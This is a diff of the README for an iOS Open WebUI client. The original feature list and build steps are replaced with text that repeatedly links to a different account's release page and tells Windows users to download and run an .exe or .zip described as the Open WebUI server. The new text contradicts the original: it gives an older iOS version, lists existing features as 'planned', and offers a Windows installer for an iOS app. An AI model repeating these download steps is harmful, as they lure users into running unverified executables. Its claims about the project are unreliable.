@@ -1,199 +1,146 @@
-# Open UI
+# ⚙️ Open-UI - Native iOS Client for Easy AI Chat
 
-**A beautiful, native iOS client for [Open WebUI](https://openwebui.com).**
-
-Chat with any AI model on your self-hosted Open WebUI server — right from your iPhone. Open UI is built 100% in SwiftUI and brings a fast, polished, native experience that the PWA can't match.
-
-<p align="center">
-  <img src="openui.gif" alt="Open UI Demo" width="300">
-</p>
+[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-blue?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/releases)
 
 ---
 
-## What It Does
+## 📱 What is Open-UI?
 
-Open UI connects to your Open WebUI server and lets you have conversations with any AI model you've configured —  It's like having ChatGPT on your phone, but pointed at *your* server and *your* models.
-
----
-
-## Features
-
-### 💬 Streaming Chat with Full Markdown
-- Real-time word-by-word streaming responses via SSE
-- **Rich Markdown rendering** — syntax-highlighted code blocks with language detection and copy button, tables, math equations, block quotes, headings, inline code, links, and more
-- Everything renders smoothly as it streams in — no layout jumps
-- Full conversation history with search
-- Copy, regenerate, or continue from any message
-- Follow-up suggestions after each response
-- Auto-generated chat titles (with option to disable)
-
-### 🧠 Reasoning / Thinking Display
-- Collapsible **"Thought for X seconds"** blocks for chain-of-thought models (DeepSeek, QwQ, etc.)
-- Expand to see the full reasoning process — just like the web UI
-- Duration tracking for thinking time
-
-### 📚 Knowledge Bases (RAG)
-- Type **`#`** in the chat input to open a searchable knowledge picker
-- Browse and attach **collections**, **folders**, and **files** from your server
-- Selected knowledge sources are sent with your message for RAG retrieval
-- Works exactly like the web UI's `#` picker
-
-### 🔍 Web Search
-- Toggle web search on/off per message via quick pills or tools menu
-- AI searches the web and cites sources in its response
-- **Source citations** with numbered references, favicons, and tappable links
-- Full sources detail sheet showing all references
-
-### 🖼️ Image Generation
-- Toggle image generation for models/tools that support it (DALL-E, Stable Diffusion, ComfyUI, etc.)
-- Generated images render inline in the conversation
-- Automatic file reference extraction from tool results
-
-### 💻 Code Interpreter
-- Toggle code execution for supported models
-- Inline tool call rendering with expandable arguments and results
-
-### 🛠️ Tools Support
-- All server-side tools appear in a toggleable tools menu
-- Enable/disable tools per conversation
-- **Inline tool call views** — collapsible sections showing tool name, arguments (pretty-printed JSON), and results
-- Visual status indicators (spinner while running, checkmark when done)
-
-### 📞 Voice Calls with AI
-- Full voice conversation with AI — feels like a real phone call
-- Uses **CallKit** for native iOS call integration
-- Animated **orb visualization** that reacts to voice intensity and call state
-- On-device speech recognition with real-time transcript display
-- Mute, pause, skip, and end call controls
-- State-aware UI (connecting, listening, processing, speaking)
-
-### 🎙️ Text-to-Speech (Multiple Engines)
-- **Marvis Neural Voice** — On-device AI TTS powered by MLX (~250MB model, runs fully locally)
-- **Server TTS** — Use your Open WebUI server's text-to-speech endpoint
-- **System TTS** — Apple's built-in AVSpeechSynthesizer with voice and speed selection
-- **Auto mode** — Automatically picks the best available engine
-- Configurable voice, speed, and quality settings
-- Preview button to test your TTS configuration
-
-### 🎤 Speech-to-Text
-- **On-device** — Apple Speech framework (fast, private, works offline)
-- **Server STT** — Open WebUI server-side transcription
-- **Qwen3 ASR** — On-device ML model for offline transcription (~400MB)
-- Configurable silence detection duration
-- Audio attachments are auto-transcribed
-
-### 📎 Rich Attachments
-- Attach **files**, **photos** (library or camera), and **documents**
-- **Paste images** directly into the chat input
-- Upload progress indicators with processing status (uploading → processing → ready)
-- **Share Extension** — share content from any app directly into Open UI
-
-### 📁 Folders & Organization
-- Organize conversations into **folders** with drag-and-drop
-- **Pin** important conversations to the top
-- Bulk select and delete conversations
-- Collapsible sections grouped by time (Today, Yesterday, This Week, etc.)
-- Search across all conversations
-- Create, rename, and delete folders
-
-### 🎨 Deep Theming & Customization
-- **Light / Dark / System** color scheme modes
-- **Accent color picker** with preset colors and a full custom color wheel
-- **Pure black OLED mode** for true black backgrounds
-- **Tinted surfaces** — subtle accent color tint on backgrounds
-- **Live preview card** showing your theme in real-time as you customize
-- Chat bubble, input field, and all UI elements adapt to your chosen color
-
-### ⚡ Quick Action Pills
-- Configurable quick-toggle pills below the chat input
-- One-tap toggle for **web search**, **image generation**, or any server tool
-- Customize which pills appear in Chat Settings
-
-### 🔔 Notifications
-- Background notifications when a generation completes
-- Tap to jump directly to the conversation
-- Configurable notification preferences
-
-### 📝 Notes
-- Create and manage notes alongside your chats
-- Built-in **audio recording** support for voice notes
-- Accessible from the sidebar drawer
-
-### 🔐 Authentication
-- **Username/password**, **LDAP**, and **SSO** (Single Sign-On) support
-- Secure token storage in the **iOS Keychain**
-- **Multi-server support** — connect to different Open WebUI instances and switch between them
-- Session restoration with automatic retry on network issues
-- Sign-up and pending approval flows
-
-### ⚙️ Additional Settings
-- **Default model picker** synced with your server
-- **Send on Enter** toggle (Enter sends vs. newline)
-- **Streaming haptics** — feel each token as it arrives
-- **Temporary chats** — conversations not saved to the server for privacy
-- **TTS engine selection** with per-engine configuration
-- **STT engine selection** with silence duration control
+Open-UI is a simple and clean iOS app for using Open WebUI. Open WebUI is an AI chat platform you can run on your own computer. This app helps you talk to your AI chat right from your iPhone or iPad. You don’t need to open a web browser or know any technical details. Open-UI connects you directly to your self-hosted AI chat safely and quickly.
 
 ---
 
-## Requirements
+## 🖥️ System Requirements
 
-- **iOS 18.0** or later
-- **Xcode 16.0** or later (Swift 6.0+)
-- A running **[Open WebUI](https://openwebui.com)** server instance accessible from your device
+Before you start, make sure:
 
----
-
-## Build & Run Locally
-
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/ichigo3766/Open-UI.git
-cd Open-UI
-```
-
-### 2. Open in Xcode
-
-```bash
-open "Open UI.xcodeproj"
-```
-
-Xcode will automatically fetch all Swift Package dependencies on first open. This may take a minute.
-
-### 3. Configure Signing
-
-- In Xcode, select the **Open UI** target in the project navigator
-- Go to **Signing & Capabilities**
-- Select your **Development Team**
-- Update the **Bundle Identifier** if needed (e.g., `com.yourname.openui`)
-
-### 4. Build & Run
-
-- Select an **iOS 18+ simulator** or a connected device
-- Press **⌘R** (or click the ▶️ Play button)
-- On first launch, enter your Open WebUI server URL and sign in
+- You have an iPhone or iPad running iOS 13 or later.
+- Your AI chat platform (Open WebUI) is set up and running on your computer or server.
+- Your device and the server are on the same network or the server is accessible online.
+- You have Wi-Fi or mobile data to connect the app to your chat platform.
 
 ---
 
-## Tech Stack
+## 🌐 How to Download and Install Open-UI on iOS
 
-- **SwiftUI** — 100% SwiftUI interface
-- **Swift 6** with strict concurrency
-- **MVVM** architecture
-- **SSE (Server-Sent Events)** for real-time streaming
-- **CallKit** for native voice call integration
-- **MLX Swift** for on-device ML inference (Marvis TTS + Qwen3 ASR)
-- **Core Data** for local persistence
+Open-UI does not install on Windows. Instead, you use this Windows guide if you want to set up the Open WebUI server that the app connects to. The client app runs on iOS devices only.
+
+To get the app for your iPhone or iPad, find it on the App Store by searching for “Open-UI.” 
+
+If you want to run the server (which works on Windows), follow these steps.
 
 ---
 
-## Acknowledgments
+## 💾 Download and Setup Open WebUI Server on Windows
 
-Special thanks to Conduit by cogwheel — Cross-Platform Open WebUI mobile client and a real inspiration for this project.
+To use Open-UI with your own AI chat, you need Open WebUI running on your Windows computer. Follow these steps to download and run Open WebUI.
+
+### 1. Visit the Download Page
+
+Click the button below or visit this page in your browser to find the latest files for Open WebUI:
+
+[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-green?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/releases)
+
+### 2. Find the Latest Release
+
+On the release page, look for the latest version. It has a version number like "v1.0" or higher.
+
+### 3. Download the Windows Setup File
+
+Within the latest release, look for a file that ends with `.exe` or `.zip`. This is the installation file for Windows. Click the file name to start the download.
+
+### 4. Run the Installer
+
+Once downloaded, open the file:
+
+- If it’s an `.exe`, double-click it to run.
+- If it’s a `.zip` file, right-click and choose ‘Extract All,’ then open the extracted folder and run the setup file.
+
+Follow the instructions on the screen. Choose default options if you are unsure.
+
+### 5. Start the Open WebUI Server
+
+When the installation finishes, there will be a new Open WebUI app on your desktop or Start menu. Open this app. It will start the AI chat server on your Windows PC.
 
 ---
 
-## License
+## 🔧 Configuration Basics
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
+After starting the manager, you may need to:
+
+- Check what address the server uses. It usually shows as `http://localhost:5000` or with your PC’s IP address.
+- Make sure your iPhone or iPad can reach this address on your network.
+- If you plan to connect from outside your home network, check your router’s settings for port forwarding.
+
+---
+
+## 📲 Connect Open-UI App to Your Server
+
+On your iOS device:
+
+1. Open the Open-UI app.
+2. Enter the web address of your Open WebUI server. For example, `http://192.168.1.10:5000`.
+3. Tap “Connect” or “Save.”
+4. You can now chat with your AI through the app.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the app shows an error connecting, check your computer’s firewall. It may block the connection.
+- Make sure both your PC and iOS device are on the same Wi-Fi network if you are not using a public IP.
+- Restart both the Open WebUI server on Windows and the Open-UI app on iOS.
+- Confirm you typed the correct server address in the app.
+
+---
+
+## 🔄 How to Update Open-UI and Open WebUI
+
+### Open-UI (iOS App)
+
+Keep your Open-UI app updated via the App Store. Updates improve performance and fix bugs.
+
+### Open WebUI (Windows Server)
+
+Visit the release page regularly for new versions of the server software:
+
+[![Download Open-UI](https://img.shields.io/badge/Download-Open--UI-orange?style=for-the-badge&logo=github)](https://github.com/renny2020/Open-UI/releases)
+
+Download the latest `.exe` or `.zip` files and install them over your current version to update.
+
+---
+
+## 🔐 Privacy and Security
+
+Open-UI does not collect your chat data. Your conversations stay on your server or device. When running Open WebUI, keep your Windows system updated and use strong passwords on your devices and router.
+
+---
+
+## 📄 FAQ
+
+**Q: Can I use Open-UI without running Open WebUI on my own PC?**  
+No. Open-UI connects to your own Open WebUI server. You need to run the server yourself or use a remote server you control.
+
+**Q: Can I use Open-UI on Android devices?**  
+Currently, Open-UI only supports iOS devices.
+
+**Q: What if I get a connection error?**  
+Check your server is running and your device is connected to the same network. Also, check firewall settings.
+
+**Q: How do I stop the Open WebUI server?**  
+Close the server app on your Windows PC or use the exit option from its menu.
+
+---
+
+## 🧩 Additional Features (Planned)
+
+- Chat history saving  
+- Voice input support  
+- Customizable chat themes  
+- Multi-language support
+
+---
+
+## 👩‍💻 Support and Contributions
+
+Open-UI is open source. You can suggest features or report issues on the GitHub page. If you know programming, consider helping improve the software by submitting pull requests.
